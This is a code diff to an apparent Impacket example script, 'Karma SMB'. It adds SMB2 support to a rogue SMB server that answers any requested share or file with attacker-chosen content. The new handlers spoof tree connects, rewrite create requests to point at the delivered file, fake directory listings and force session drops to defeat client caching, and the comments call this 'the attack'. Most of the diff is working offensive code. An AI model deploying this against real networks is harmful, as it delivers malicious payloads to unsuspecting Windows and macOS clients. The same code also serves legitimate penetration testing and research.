@@ -5,8 +5,6 @@
 # of the Apache Software License. See the accompanying LICENSE file
 # for more information.
 #
-# $Id$
-#
 # Karma SMB
 #
 # Author:
@@ -26,11 +24,24 @@
 #      com = /tmp/comfile
 #      exe = /tmp/exefile
 #
+#   The SMB2 support works with a caveat. If two different
+#   filenames at the same share are requested, the first
+#   one will work and the second one will not work if the request
+#   is performed right away. This seems related to the 
+#   QUERY_DIRECTORY request, where we return the files available.
+#   In the first try, we return the file that was asked to open.
+#   In the second try, the client will NOT ask for another 
+#   QUERY_DIRECTORY but will use the cached one. This time the new file
+#   is not there, so the client assumes it doesn't exist.
+#   After a few seconds, looks like the client cache is cleared and
+#   the operation works again. Further research is needed trying
+#   to avoid this from happening.
+#
+#   SMB1 seems to be working fine on that scenario.
+#
 #   ToDo:
 #   [ ] A lot of testing needed under different OSes. 
 #       I'm still not sure how reliable this approach is.
-#   [X] It's not working for first level directories 
-#       (e.g. \\IP\share\file) - DONE
 #   [ ] Add support for other SMB read commands. Right now just
 #       covering SMB_COM_NT_CREATE_ANDX
 #   [ ] Disable write request, now if the client tries to copy 
@@ -44,11 +55,12 @@ import os
 import argparse
 
 from impacket import smbserver, smb, version
+import impacket.smb3structs as smb2
 from impacket.smb import *
 from impacket.smbserver import *
 
 class KarmaSMBServer(Thread):
-    def __init__(self):
+    def __init__(self, smb2Support = False):
         Thread.__init__(self)
         self.server = 0
         self.defaultFile = None
@@ -84,6 +96,9 @@ class KarmaSMBServer(Thread):
         smbConfig.set('SYSVOL','share type','0')
         smbConfig.set('SYSVOL','path','')
 
+        if smb2Support:
+            smbConfig.set("global", "SMB2Support", "True")
+
         self.server = smbserver.SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)
         self.server.processConfigFile()
 
@@ -95,10 +110,19 @@ class KarmaSMBServer(Thread):
         self.server.unregisterSmbCommand(smb.SMB.SMB_COM_WRITE)
         self.server.unregisterSmbCommand(smb.SMB.SMB_COM_WRITE_ANDX)
 
+        self.server.unregisterSmb2Command(smb2.SMB2_WRITE)
+
         self.origsmbComNtCreateAndX = self.server.hookSmbCommand(smb.SMB.SMB_COM_NT_CREATE_ANDX, self.smbComNtCreateAndX)
         self.origsmbComTreeConnectAndX = self.server.hookSmbCommand(smb.SMB.SMB_COM_TREE_CONNECT_ANDX, self.smbComTreeConnectAndX)
         self.origQueryPathInformation = self.server.hookTransaction2(smb.SMB.TRANS2_QUERY_PATH_INFORMATION, self.queryPathInformation)
         self.origFindFirst2 = self.server.hookTransaction2(smb.SMB.TRANS2_FIND_FIRST2, self.findFirst2)
+
+        # And the same for SMB2
+        self.origsmb2TreeConnect = self.server.hookSmb2Command(smb2.SMB2_TREE_CONNECT, self.smb2TreeConnect)
+        self.origsmb2Create = self.server.hookSmb2Command(smb2.SMB2_CREATE, self.smb2Create)
+        self.origsmb2QueryDirectory = self.server.hookSmb2Command(smb2.SMB2_QUERY_DIRECTORY, self.smb2QueryDirectory)
+        self.origsmb2Read = self.server.hookSmb2Command(smb2.SMB2_READ, self.smb2Read)
+        self.origsmb2Close = self.server.hookSmb2Command(smb2.SMB2_CLOSE, self.smb2Close)
 
         # Now we have to register the MS-SRVS server. This specially important for 
         # Windows 7+ and Mavericks clients since they WONT (specially OSX) 
@@ -240,6 +264,10 @@ class KarmaSMBServer(Thread):
         return self.origsmbComNtCreateAndX(connId, smbServer, SMBCommand, recvPacket)
 
     def queryPathInformation(self, connId, smbServer, recvPacket, parameters, data, maxDataCount = 0):
+        # The trick we play here is that Windows clients first ask for the file
+        # and then it asks for the directory containing the file.
+        # It is important to answer the right questions for the attack to work
+        
         connData = smbServer.getConnectionData(connId)
 
         respSetup = ''
@@ -262,14 +290,15 @@ class KarmaSMBServer(Thread):
 
                smbServer.log("Client is asking for QueryPathInformation for: %s" % origPathName,logging.INFO)
                if connData['MS15011'].has_key(origPathName) or origPathName == '.':
-                  # We already processed this entry, now it's asking for a directory
+                   # We already processed this entry, now it's asking for a directory
                    infoRecord, errorCode = queryPathInformation(path, '/', queryPathInfoParameters['InformationLevel'])
                else:
+                   # First time asked, asking for the file
                    infoRecord, errorCode = queryPathInformation(path, self.defaultFile, queryPathInfoParameters['InformationLevel'])
                    connData['MS15011'][os.path.dirname(origPathName)] = infoRecord
             except Exception, e:
-               import traceback
-               traceback.print_exc()
+               #import traceback
+               #traceback.print_exc()
                smbServer.log("queryPathInformation: %s" % e,logging.ERROR)
 
             if infoRecord is not None:
@@ -281,6 +310,191 @@ class KarmaSMBServer(Thread):
         smbServer.setConnectionData(connId, connData)
 
         return respSetup, respParameters, respData, errorCode
+
+    def smb2Read(self, connId, smbServer, recvPacket):
+        connData = smbServer.getConnectionData(connId)
+        connData['MS15011']['StopConnection'] = True
+        smbServer.setConnectionData(connId, connData)
+        return self.origsmb2Read(connId, smbServer, recvPacket)
+ 
+    def smb2Close(self, connId, smbServer, recvPacket):
+        connData = smbServer.getConnectionData(connId)
+        # We're closing the connection trying to flush the client's
+        # cache.
+        if connData['MS15011']['StopConnection'] == True:
+            return [smb2.SMB2Error()], None, STATUS_USER_SESSION_DELETED
+        return self.origsmb2Close(connId, smbServer, recvPacket)
+
+    def smb2Create(self, connId, smbServer, recvPacket):
+        connData = smbServer.getConnectionData(connId)
+
+        ntCreateRequest       = smb2.SMB2Create(recvPacket['Data'])
+
+        # Let's try to avoid allowing write requests from the client back to us
+        # not 100% bulletproof, plus also the client might be using other SMB
+        # calls 
+        createOptions =  ntCreateRequest['CreateOptions']
+        if createOptions & smb2.FILE_DELETE_ON_CLOSE == smb2.FILE_DELETE_ON_CLOSE:
+            errorCode = STATUS_ACCESS_DENIED
+        elif ntCreateRequest['CreateDisposition'] & smb2.FILE_OVERWRITE == smb2.FILE_OVERWRITE:
+            errorCode = STATUS_ACCESS_DENIED
+        elif ntCreateRequest['CreateDisposition'] & smb2.FILE_OVERWRITE_IF == smb2.FILE_OVERWRITE_IF:
+            errorCode = STATUS_ACCESS_DENIED
+        elif ntCreateRequest['DesiredAccess'] & smb2.FILE_WRITE_DATA == smb2.FILE_WRITE_DATA:
+            errorCode = STATUS_ACCESS_DENIED
+        elif ntCreateRequest['DesiredAccess'] & smb2.FILE_APPEND_DATA == smb2.FILE_APPEND_DATA:
+            errorCode = STATUS_ACCESS_DENIED
+        elif ntCreateRequest['DesiredAccess'] & smb2.GENERIC_WRITE == smb2.GENERIC_WRITE:
+            errorCode = STATUS_ACCESS_DENIED
+        elif ntCreateRequest['DesiredAccess'] & 0x10000 == 0x10000:
+            errorCode = STATUS_ACCESS_DENIED
+        else:
+            errorCode = STATUS_SUCCESS
+
+        if errorCode == STATUS_ACCESS_DENIED:
+            return [smb2.SMB2Error()], None, errorCode
+
+        # 1. Let's grab the extension and map the file's contents we will deliver
+        origPathName = os.path.normpath(ntCreateRequest['Buffer'][:ntCreateRequest['NameLength']].decode('utf-16le').replace('\\','/'))
+
+        _, origPathNameExtension = os.path.splitext(origPathName)
+        origPathNameExtension = origPathNameExtension.upper()[1:]
+
+        # Are we being asked for a directory?
+        if (createOptions & smb2.FILE_DIRECTORY_FILE) == 0:
+            if self.extensions.has_key(origPathNameExtension.upper()):
+                targetFile = self.extensions[origPathNameExtension.upper()]
+            else:
+                targetFile = self.defaultFile
+            connData['MS15011']['FileData'] = (os.path.basename(origPathName), targetFile)
+            smbServer.log("%s is asking for %s. Delivering %s" % (connData['ClientIP'], origPathName,targetFile),logging.INFO)
+        else:
+            targetFile = '/'
+        
+        # 2. We change the filename in the request for our targetFile
+        ntCreateRequest['Buffer'] = targetFile.encode('utf-16le')
+        ntCreateRequest['NameLength'] = len(targetFile)*2
+        recvPacket['Data'] = str(ntCreateRequest)
+
+        # 3. We call the original call with our modified data
+        return self.origsmb2Create(connId, smbServer, recvPacket)
+
+    def smb2QueryDirectory(self, connId, smbServer, recvPacket):
+        # Windows clients with SMB2 will also perform a QueryDirectory
+        # expecting to get the filename asked. So we deliver it :)
+        connData = smbServer.getConnectionData(connId)
+
+        respSMBCommand = smb2.SMB2QueryDirectory_Response()
+        queryDirectoryRequest   = smb2.SMB2QueryDirectory(recvPacket['Data'])
+
+        errorCode = 0xff
+        respSMBCommand['Buffer'] = '\x00' 
+
+        errorCode = STATUS_SUCCESS
+
+        #if (queryDirectoryRequest['Flags'] & smb2.SL_RETURN_SINGLE_ENTRY) == 0:
+        #    return [smb2.SMB2Error()], None, STATUS_NOT_SUPPORTED
+
+        if connData['MS15011']['FindDone'] is True:
+            
+            connData['MS15011']['FindDone'] = False
+            smbServer.setConnectionData(connId, connData)
+            return [smb2.SMB2Error()], None, STATUS_NO_MORE_FILES 
+        else:
+            origName, targetFile =  connData['MS15011']['FileData']
+            (mode, ino, dev, nlink, uid, gid, size, atime, mtime, ctime) = os.stat(targetFile)
+
+            infoRecord = smb.SMBFindFileIdBothDirectoryInfo( smb.SMB.FLAGS2_UNICODE )
+            infoRecord['ExtFileAttributes'] = smb.ATTR_NORMAL | smb.ATTR_ARCHIVE
+
+            infoRecord['EaSize']            = 0
+            infoRecord['EndOfFile']         = size
+            infoRecord['AllocationSize']    = size
+            infoRecord['CreationTime']      = getFileTime(ctime)
+            infoRecord['LastAccessTime']    = getFileTime(atime)
+            infoRecord['LastWriteTime']     = getFileTime(mtime)
+            infoRecord['LastChangeTime']    = getFileTime(mtime)
+            infoRecord['ShortName']         = '\x00'*24
+            #infoRecord['FileName']          = os.path.basename(origName).encode('utf-16le')
+            infoRecord['FileName']          = origName.encode('utf-16le')
+            padLen = (8-(len(infoRecord) % 8)) % 8
+            infoRecord['NextEntryOffset']   = 0
+
+            respSMBCommand['OutputBufferOffset'] = 0x48
+            respSMBCommand['OutputBufferLength'] = len(infoRecord.getData())
+            respSMBCommand['Buffer'] = infoRecord.getData() + '\xaa'*padLen
+            connData['MS15011']['FindDone'] = True
+
+        smbServer.setConnectionData(connId, connData)
+        return [respSMBCommand], None, errorCode
+
+    def smb2TreeConnect(self, connId, smbServer, recvPacket):
+        connData = smbServer.getConnectionData(connId)
+
+        respPacket = smb2.SMB2Packet()
+        respPacket['Flags']     = smb2.SMB2_FLAGS_SERVER_TO_REDIR
+        respPacket['Status']    = STATUS_SUCCESS
+        respPacket['CreditRequestResponse'] = 1
+        respPacket['Command']   = recvPacket['Command']
+        respPacket['SessionID'] = connData['Uid']
+        respPacket['Reserved']  = recvPacket['Reserved']
+        respPacket['MessageID'] = recvPacket['MessageID']
+        respPacket['TreeID']    = recvPacket['TreeID']
+
+        respSMBCommand        = smb2.SMB2TreeConnect_Response()
+
+        treeConnectRequest = smb2.SMB2TreeConnect(recvPacket['Data'])
+
+        errorCode = STATUS_SUCCESS
+
+        ## Process here the request, does the share exist?
+        path = str(recvPacket)[treeConnectRequest['PathOffset']:][:treeConnectRequest['PathLength']]
+        UNCOrShare = path.decode('utf-16le')
+
+        # Is this a UNC?
+        if ntpath.ismount(UNCOrShare):
+            path = UNCOrShare.split('\\')[3]
+        else:
+            path = ntpath.basename(UNCOrShare)
+
+        # We won't search for the share.. all of them exist :P
+        #share = searchShare(connId, path.upper(), smbServer) 
+        connData['MS15011'] = {}
+        connData['MS15011']['FindDone'] = False
+        connData['MS15011']['StopConnection'] = False
+        share = {}
+        if share is not None:
+            # Simple way to generate a Tid
+            if len(connData['ConnectedShares']) == 0:
+               tid = 1
+            else:
+               tid = connData['ConnectedShares'].keys()[-1] + 1
+            connData['ConnectedShares'][tid] = share
+            connData['ConnectedShares'][tid]['path'] = '/'
+            connData['ConnectedShares'][tid]['shareName'] = path
+            respPacket['TreeID']    = tid
+            #smbServer.log("Connecting Share(%d:%s)" % (tid,path))
+        else:
+            smbServer.log("SMB2_TREE_CONNECT not found %s" % path, logging.ERROR)
+            errorCode = STATUS_OBJECT_PATH_NOT_FOUND
+            respPacket['Status'] = errorCode
+        ##
+
+        if path == 'IPC$':
+            respSMBCommand['ShareType'] = smb2.SMB2_SHARE_TYPE_PIPE
+            respSMBCommand['ShareFlags'] = 0x30
+        else:
+            respSMBCommand['ShareType'] = smb2.SMB2_SHARE_TYPE_DISK
+            respSMBCommand['ShareFlags'] = 0x0
+
+        respSMBCommand['Capabilities'] = 0
+        respSMBCommand['MaximalAccess'] = 0x011f01ff
+
+        respPacket['Data'] = respSMBCommand
+
+        smbServer.setConnectionData(connId, connData)
+
+        return None, [respPacket], errorCode
 
     def smbComTreeConnectAndX(self, connId, smbServer, SMBCommand, recvPacket):
         connData = smbServer.getConnectionData(connId)
@@ -373,6 +587,7 @@ if __name__ == '__main__':
     parser.add_argument("--help", action="help", help='show this help message and exit')
     parser.add_argument('fileName', action='store', metavar = 'pathname', help='Filename''s contents to deliver to SMB clients')
     parser.add_argument('-config', type=argparse.FileType('r'), metavar = 'pathname', help='config file name to map extensions to files to deliver. For those extensions not present, pathname will be delivered')
+    parser.add_argument('-smb2support', action='store_true', default=False, help='SMB2 Support (experimental!)')
 
 
     if len(sys.argv)==1:
@@ -385,7 +600,7 @@ if __name__ == '__main__':
        print e
        sys.exit(1)
 
-    s = KarmaSMBServer()
+    s = KarmaSMBServer(options.smb2support)
     s.setDefaultFile(os.path.normpath(options.fileName))
     if options.config is not None:
         s.setExtensionsConfig(options.config)
